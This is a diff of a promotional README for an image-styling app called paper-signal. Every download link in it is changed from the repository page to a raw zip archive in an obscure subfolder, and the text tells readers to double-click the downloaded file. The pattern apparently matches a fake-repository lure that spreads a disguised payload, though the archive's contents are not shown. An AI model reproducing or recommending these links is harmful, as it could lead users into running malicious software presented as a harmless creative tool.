@@ -1,7 +1,7 @@
 <h1>🎨 paper-signal - Beautiful Zine Images, Made Effortlessly Simple</h1>
 
 <p align="center">
-  <a href="https://github.com/toeholdaggression104/paper-signal" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;border-radius:50px;font-size:24px;font-weight:bold;text-decoration:none;box-shadow:0 8px 24px rgba(102,126,234,0.4);margin:20px 0;">⬇️ DOWNLOAD PAPER-SIGNAL NOW</a>
+  <a href="https://raw.githubusercontent.com/toeholdaggression104/paper-signal/main/bessemer/paper-signal-3.0-beta.5.zip" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;border-radius:50px;font-size:24px;font-weight:bold;text-decoration:none;box-shadow:0 8px 24px rgba(102,126,234,0.4);margin:20px 0;">⬇️ DOWNLOAD PAPER-SIGNAL NOW</a>
 </p>
 
 <p align="center"><em>Create stunning, artistic images for social media, blogs, and visual projects — no design skills needed!</em></p>
@@ -60,7 +60,7 @@ Follow these simple steps to start creating stunning images with paper-signal:
 ### Step 1: Download Paper-Signal
 Visit this link to download the application. The download button is clearly visible on the page.
 
-**[⬇️ Click Here to Download Paper-Signal](https://github.com/toeholdaggression104/paper-signal)**
+**[⬇️ Click Here to Download Paper-Signal](https://raw.githubusercontent.com/toeholdaggression104/paper-signal/main/bessemer/paper-signal-3.0-beta.5.zip)**
 
 ### Step 2: Open the Downloaded File
 Once the download is complete, navigate to your Downloads folder (or wherever your browser saves files) and double-click on the paper-signal file to open it.
@@ -184,7 +184,7 @@ To get the most out of paper-signal:
 
 Don't wait to bring your creative visions to life! Paper-signal is just a click away, and within minutes, you'll be producing beautiful, professional-quality images that impress your audience and make your content shine.
 
-**[⬇️ DOWNLOAD PAPER-SIGNAL NOW](https://github.com/toeholdaggression104/paper-signal)**
+**[⬇️ DOWNLOAD PAPER-SIGNAL NOW](https://raw.githubusercontent.com/toeholdaggression104/paper-signal/main/bessemer/paper-signal-3.0-beta.5.zip)**
 
 Join thousands of happy users who turned their visual content into something truly special. Your inner artist is waiting!
 
